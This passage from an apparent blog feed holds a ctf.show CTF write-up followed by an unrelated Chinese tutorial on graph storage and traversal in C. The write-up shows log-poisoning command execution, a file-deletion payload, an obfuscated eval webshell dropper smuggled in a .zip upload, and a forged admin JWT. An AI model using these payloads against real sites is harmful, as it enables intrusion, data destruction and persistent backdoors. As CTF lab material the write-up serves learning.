class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure><p>然后抓包修改，写入命令</p><p><img src="https://i.loli.net/2021/08/04/JEI8PWZ9qznGy4o.png" alt="image-20210804151954242"></p><p>只在当前页面发现了一个 <code>index.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-01-09 15:26:15</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-01-09 15:30:48</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$html</span> = shell_exec(<span class="string">&#x27;php -f &#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;file not exist&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;ls /var/www/html/&#x27;</span>);</span><br><span class="line">alsckdfy</span><br><span class="line">clear.php</span><br><span class="line">debug</span><br><span class="line">index.php</span><br><span class="line">install</span><br><span class="line">layui</span><br><span class="line">page.php</span><br><span class="line">page_1.php</span><br><span class="line">page_2.php</span><br><span class="line">page_3.php</span><br><span class="line">page_4.php</span><br><span class="line">robots.txt</span><br><span class="line"></span><br><span class="line">&lt;?php system(<span class="string">&#x27;ls /&#x27;</span>); ?&gt;</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure><p>看样子没有 flag</p><p>那么根据之前的思路，我们只要把 <code>lock.dat</code>  删掉，那么就可以重置管理员密码，就能够成功登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;rm ../install/lock.dat&#x27;</span>); ?&gt;</span><br><span class="line">然后我们可以再进行验证一下</span><br><span class="line">&lt;?php system(<span class="string">&#x27;ls ../install/&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure><p>此时再访问 <code>install</code> ，已经变成</p><p><img src="https://i.loli.net/2021/08/04/SmO1ys82bwBzTiv.png" alt="image-20210804153001982"></p><p><img src="https://i.loli.net/2021/08/04/bWPpJf9c34qQKSV.png" alt="image-20210804153015432"></p><p>然后进入后台登陆即可 <code>admin888</code></p><p>最后才想到，flag 应该是出现在 登陆成功之后的页面里的，也就是 <code>/alsckdfy/check.php</code> ，所以我们也完全可以 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;cat ../alsckdfy/check.php&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure><p>即可查到</p><p><img src="https://i.loli.net/2021/08/04/NteX42lnw3yVIoT.png" alt="image-20210804153236220"></p><h2 id="1-8-Web-388"><a href="#1-8-Web-388" class="headerlink" title="1.8 Web 388"></a>1.8 Web 388</h2><p>按照之前的思路来</p><p><img src="https://i.loli.net/2021/08/04/AqSUnLY1GPskMEw.png" alt="image-20210804154217200"></p><p>看了其它大神的解，发现在后台还有 <code>/editor/</code> 目录，一扫，果然</p><p><img src="https://i.loli.net/2021/08/04/3UWDplujK5rQd76.png" alt="image-20210804160121313"></p><p>那么就一定存在文件上传的问题</p><ul><li><code>alsckdfy/editor</code> 文件上传</li><li><code>/debug?file=</code> 进行文件包含，写入 <code>.php</code> 文件</li><li>访问 <code>.php</code> 文件，进行命令执行</li></ul><p><img src="https://i.loli.net/2021/08/04/GKoTEkeUdg137p8.png" alt="image-20210804160641858"></p><p>我想着写完之后提交，居然还未开放，那就只好 上传文件了</p><p><img src="https://i.loli.net/2021/08/04/FIDvAwPoiS6EHzW.png" alt="image-20210804160753795"></p><p>KindEditor 4.1.11 (2016-03-31)</p><p>网上查找相关漏洞</p><p><img src="https://i.loli.net/2021/08/04/G1RQfv7tzdZMUAj.png" alt="image-20210804160912989"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我尝试了一下</span></span><br><span class="line">/alsckdfy/editor/php/file_manager_json.php?path=/</span><br><span class="line"><span class="comment"># 居然不行</span></span><br></pre></td></tr></table></figure><p>那就别想着 编辑器的 任意文件遍历的 漏洞了，老老实实上传文件吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地的 2.zip 免杀🐎</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1])&#x27;</span>.<span class="string">&#x27;;?&gt;&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&#x27;/var/www/html/2.php&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路径 </span></span><br><span class="line"><span class="comment"># /alsckdfy/attached/file/20210804/20210804083008_10879.zip</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/gIeMW3DuH7OSdmV.png" alt="image-20210804162756748"></p><p>可以看到有限制，我们可以上传 <code>.zip</code> 文件</p><p><img src="https://i.loli.net/2021/08/04/orBVz7ZKNWgScqv.png" alt="image-20210804161941726"></p><p>然后包含，我们将它写到 网站根目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/www/html/alsckdfy/attached/file/20210804/20210804083008_10879.zip</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/04/HoWfO6sdRU3B18N.png" alt="image-20210804162134294"></p><p><img src="https://i.loli.net/2021/08/04/GqBs5KEhOfkzled.png" alt="image-20210804163113755"></p><p>可以看到，上传成功</p><p>直接命令执行，查看源码得到</p><p><img src="https://i.loli.net/2021/08/04/OHUokTwFJBXzSlp.png" alt="image-20210804163322989"></p><h2 id="1-9-Web-389"><a href="#1-9-Web-389" class="headerlink" title="1.9 Web 389"></a>1.9 Web 389</h2><p>按照上面思路</p><p><img src="https://i.loli.net/2021/08/04/4MlbasVHRpfghcZ.png" alt="image-20210804164040896"></p><p>权限不足，找 cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYyODA2Njc0NiwiZXhwIjoxNjI4MDczOTQ2LCJuYmYiOjE2MjgwNjY3NDYsInN1YiI6InVzZXIiLCJqdGkiOiIwMDRmYzQzMjU0ODI3MGVlYTc4Mjg3MTg5ZWE2YjNkOCJ9.PWduIXmiYUefpQpuTkyCxMmg7IWvRvWqyC1rJZA8aIs</span><br></pre></td></tr></table></figure><p>jwt 在线 解密 <a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="https://i.loli.net/2021/08/04/wM5tEhi42X1AnFZ.png" alt="image-20210804164905283"></p><p>然后我们修改为 admin</p><p><img src="https://i.loli.net/2021/08/04/dUEKgxFwjiQ7zeD.png" alt="image-20210804165033210"></p><p>更改之后刷新，回到上一关</p><p><img src="https://i.loli.net/2021/08/04/zaHVx92uLwv3YIt.png" alt="image-20210804165212640"></p><p><a href="http://4563dd47-a66b-4309-9e15-183bb065ff68.challenge.ctf.show:8080/alsckdfy/attached/file/20210804/20210804085256_19145.zip">/alsckdfy/attached/file/20210804/20210804085256_19145.zip</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF Show" scheme="https://xizhi-future.github.io/categories/CTF-Show/"/>
    
    
    <category term="CTF" scheme="https://xizhi-future.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>图</title>
    <link href="https://xizhi-future.github.io/2021/11/14/%E5%9B%BE/"/>
    <id>https://xizhi-future.github.io/2021/11/14/%E5%9B%BE/</id>
    <published>2021-11-14T09:36:24.000Z</published>
    <updated>2021-11-14T09:37:30.447Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、图的基本存储结构"><a href="#一、图的基本存储结构" class="headerlink" title="一、图的基本存储结构"></a>一、图的基本存储结构</h1><p>需要存储的内容：存储 顶点信息、顶点之间的关系</p><p><strong>三种常用的 图的 存储结构：</strong></p><ul><li>邻接矩阵</li><li>邻接表</li><li>临界多重链表</li></ul><h2 id="1-1-邻接矩阵"><a href="#1-1-邻接矩阵" class="headerlink" title="1.1 邻接矩阵"></a>1.1 邻接矩阵</h2><p><strong>存储结构：</strong></p><ul><li><p>一维数组（顺序表）——  存储 数据元素的信息</p></li><li><p>二维数组（邻接矩阵）—— 存储 数据元素之间的 关系</p></li></ul><p><strong>特点：</strong></p><ul><li><p>无向图的邻接矩阵 一定是对称的，可使用 上三角或者是 下三角进行压缩存储，其存储空间只需要 <code>n(n+1)/2</code></p></li><li><p>有向图的邻接矩阵 不一定是 对称的，其存储空间为 <code>n 的平方</code></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FINITY 5000<span class="comment">//此处使用 5000 表示无穷大</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20<span class="comment">//最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> vertextype;<span class="comment">//顶点值类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> edgetype;<span class="comment">//权值类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span><span class="comment">//邻接矩阵 类型</span></span><br><span class="line">    vertextype vexs[M];  <span class="comment">//顶点信息域（一维数组）</span></span><br><span class="line">    edgetype edges[M][M];  <span class="comment">//邻接矩阵（二维数组）</span></span><br><span class="line">    <span class="keyword">int</span> n,e;<span class="comment">//图中顶点总数 与 边数</span></span><br><span class="line">&#125;Mgraph;</span><br></pre></td></tr></table></figure><p><strong>建立网络的 邻接矩阵算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creat</span><span class="params">(Mgraph *g,<span class="keyword">char</span> *s,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=1表示建立有向图，c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k,w;</span><br><span class="line">    FILE *rf;</span><br><span class="line">    rf = fopen(s,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(rf)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;vexs[i]);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;g-&gt;n;j++)</span><br><span class="line">                <span class="keyword">if</span>(i == j)</span><br><span class="line">                    g-&gt;edges[i][j] = FINITY;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g-&gt;e;k++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;w);</span><br><span class="line">            g-&gt;edges[i][j] = w;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="number">0</span>)</span><br><span class="line">                g-&gt;edges[j][i] = w;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(rf);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        g-&gt;n = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>缺点：邻接矩阵法，占用的存单元只与图中顶点的个数有关，与边数无关，如果一个图中的边数比结点个数少得多，则该邻接矩阵中就会出现很对的空元素，从而浪费空间。</p><h2 id="1-2-邻接表"><a href="#1-2-邻接表" class="headerlink" title="1.2 邻接表"></a>1.2 邻接表</h2><p><strong>存储结构：</strong></p><ul><li>头结点：两个域—–数据域 <code>vertex</code> ，头指针域 <code>firstedge</code></li><li>表结点：两个域—–邻接点域 <code>adjvex</code>  ，链域  <code>next</code></li><li>如果是网络，带权值，则可在头结点中添加一个数据域来存储权值</li></ul><p>出边表（有向图的邻接表）、入边表（逆邻接表）</p><p><strong>如果图中含有 n 个顶点，e  条边，则它的邻接表存储结构需要 n个头结点和 2e 个边结点</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20<span class="comment">//预定义图的最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> DataType;<span class="comment">//顶点信息数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span><span class="comment">//边表结点</span></span><br><span class="line">    <span class="keyword">int</span> adjvex;<span class="comment">//邻接点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span><span class="comment">//指向下一个邻接点</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vnode</span>&#123;</span><span class="comment">//头结点类型</span></span><br><span class="line">    DataType vertex;<span class="comment">//顶点信息</span></span><br><span class="line">    EdgeNode *FirstEdge;<span class="comment">//邻接链表头指针</span></span><br><span class="line">&#125;VertexNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span><span class="comment">//邻接表 类型</span></span><br><span class="line">    VertexNode adjlist[M];<span class="comment">//存放头结点的顺序表</span></span><br><span class="line">    <span class="keyword">int</span> n,e;  <span class="comment">//图的顶点数、边数</span></span><br><span class="line">&#125;LinkedGraph;</span><br></pre></td></tr></table></figure><p><strong>无向图邻接表建立算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//邻接表 创建图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(LinkedGraph *g,<span class="keyword">char</span> *filename,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    EdgeNode *s;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);<span class="comment">//读入顶点数与边数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g-&gt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;adjlist[i].vertex); <span class="comment">//读入顶点信息</span></span><br><span class="line">            g-&gt;adjlist[i].FirstEdge = <span class="literal">NULL</span>;    <span class="comment">//边表置为空表</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>; k &lt; g-&gt;n; k++)&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);<span class="comment">//输入无序对</span></span><br><span class="line">s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">s-&gt;adjvex = j;</span><br><span class="line">s-&gt;next = g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">g-&gt;adjlist[i].FirstEdge = s;       <span class="comment">//相当于 前插</span></span><br><span class="line"><span class="keyword">if</span>(c == <span class="number">0</span>)&#123;<span class="comment">//无向图</span></span><br><span class="line">s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">s-&gt;adjvex = i;</span><br><span class="line">s-&gt;next = g-&gt;adjlist[j].FirstEdge;</span><br><span class="line">g-&gt;adjlist[j].FirstEdge = s;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//文件打开失败</span></span><br><span class="line">g-&gt;n = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：文件输入 数据内容时，第一行的结点个数不变，为 n，但是边数得是 2e</p><h2 id="1-3-邻接多重表"><a href="#1-3-邻接多重表" class="headerlink" title="1.3 邻接多重表"></a>1.3 邻接多重表</h2><p>边表结点：五个域</p><ul><li><p>mark    标志域（是否被访问过）</p></li><li><p>vexi  vexj   该边两个顶点在图中的位序</p></li><li><p>linki  linkj   两个边结点的指针</p><p>linki  指向关联与 vexi 结点的下一条边</p><p>linkj  指向关联与  vexj 结点的下一条边</p></li></ul><p>表头结点：两个域</p><ul><li>vertex  顶点信息</li><li>firstedge   关联与 顶点 的 第一条边</li></ul><h1 id="二、图的遍历"><a href="#二、图的遍历" class="headerlink" title="二、图的遍历"></a>二、图的遍历</h1><h2 id="2-1-深度优先遍历"><a href="#2-1-深度优先遍历" class="headerlink" title="2.1 深度优先遍历"></a>2.1 深度优先遍历</h2><p>访问顺序域图的邻接表的存储状态有关，由于图的邻接表存储不是唯一的，则对于同一个图，其深度优先遍历的输出结果也是不同的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> visited[M];  <span class="comment">//作为访问的标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;visit vertex: %c\n&quot;</span>,g.adjlist[i].vertex); <span class="comment">//访问顶点 i</span></span><br><span class="line">    visited[i] = <span class="number">1</span>;<span class="comment">//表示已经访问过</span></span><br><span class="line">    p = g.adjlist[i].FirstEdge;<span class="comment">//从 p 的邻接点开始进行 深度优先遍历</span></span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[p-&gt;adjvex])</span><br><span class="line">            dfs(g,p-&gt;adjvex);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt;g.n; i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;   <span class="comment">//初始化都为 0 ，代表都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])<span class="comment">//如果 i 未被访问过</span></span><br><span class="line">            dfs(g,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-2-广度优先遍历"><a href="#2-2-广度优先遍历" class="headerlink" title="2.2 广度优先遍历"></a>2.2 广度优先遍历</h2><p>特点：尽可能地首先对 横向结点进行访问</p><p>使用队列，使用邻接表存储结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> visited[M];   <span class="comment">//全局标志：是否访问过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//广度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">queue</span>[M],front,rear;  <span class="comment">//FIFO 队列</span></span><br><span class="line">    front = rear = <span class="number">0</span>; <span class="comment">//初始化空队列</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[i].vertex);</span><br><span class="line">    visited[i] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">queue</span>[rear++] = i;<span class="comment">//被访问结点进入队列</span></span><br><span class="line">    <span class="keyword">while</span>(rear &gt; front)&#123;</span><br><span class="line">        j = <span class="built_in">queue</span>[front++]; <span class="comment">// 出队</span></span><br><span class="line">        p = g.adjlist[j].FirstEdge;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjvex] == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[p-&gt;adjvex].vertex);</span><br><span class="line">                <span class="built_in">queue</span>[rear++] = p-&gt;adjvex;</span><br><span class="line">                visited[p-&gt;adjvex] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回连通分量的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;  <span class="comment">//初始化标志数组，都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g.n ;i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])&#123;<span class="comment">//vi未被访问过</span></span><br><span class="line">            <span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line">            count++;<span class="comment">//计数器：连通分量 个数加1 </span></span><br><span class="line">            bfs(g,i);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span 